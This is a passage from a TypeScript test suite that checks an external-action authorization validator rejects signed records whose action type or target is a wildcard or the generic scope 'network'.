      );
    });

    it("rejects generic or wildcard actionType and target scopes in explicit authorizations", () => {
      const payload = { test: true };
      const payloadDigest = computePayloadDigest(payload);

      // Wildcard actionType
      const wildcardActionRecord: ExternalActionAuthorizationRecord = {
        toolId: "tool_compiler",
        toolVersion: "1.0.0",
        actionType: "*",
        target: "https://api.github.com/repos",
        payloadDigest,
        approver: "security_alice",
        expiresAt: new Date(Date.now() + 3600000).toISOString(),
        keyId: trustedKeyId,
        signature: validSignature,
      };
      const resWildAction = validateExternalActionAuthorization(
        wildcardActionRecord,
        {
          toolId: "tool_compiler",
          toolVersion: "1.0.0",
          actionType: "publish",
          target: "https://api.github.com/repos",
          payload,
        },
        { verifier: sampleAuthVerifier },
      );
      expect(resWildAction.valid).toBe(false);
      expect(resWildAction.reason).toContain("Generic or wildcard actionType");

      // Wildcard target
      const wildcardTargetRecord: ExternalActionAuthorizationRecord = {
        toolId: "tool_compiler",
        toolVersion: "1.0.0",
        actionType: "publish",
        target: "*",
        payloadDigest,
        approver: "security_alice",
        expiresAt: new Date(Date.now() + 3600000).toISOString(),
        keyId: trustedKeyId,
        signature: validSignature,
      };
      const resWildTarget = validateExternalActionAuthorization(
        wildcardTargetRecord,
        {
          toolId: "tool_compiler",
          toolVersion: "1.0.0",
          actionType: "publish",
          target: "https://api.github.com/repos",
          payload,
        },
        { verifier: sampleAuthVerifier },
      );
      expect(resWildTarget.valid).toBe(false);
      expect(resWildTarget.reason).toContain("Generic or wildcard target");

      // Generic target 'network'
      const genericTargetRecord: ExternalActionAuthorizationRecord = {
        toolId: "tool_compiler",
        toolVersion: "1.0.0",
        actionType: "publish",
        target: "network",
        payloadDigest,
        approver: "security_alice",
        expiresAt: new Date(Date.now() + 3600000).toISOString(),
        keyId: trustedKeyId,
        signature: validSignature,
      };
      const resGenTarget = validateExternalActionAuthorization(
        genericTargetRecord,
        {
          toolId: "tool_compiler",
          toolVersion: "1.0.0",
          actionType: "publish",
          target: "https://api.github.com/repos",
          payload,
        },
        { verifier: sampleAuthVerifier },
      );
      expect(resGenTarget.valid).toBe(false);
      expect(resGenTarget.reason).toContain("Generic or wildcard target");
    });
  });
});
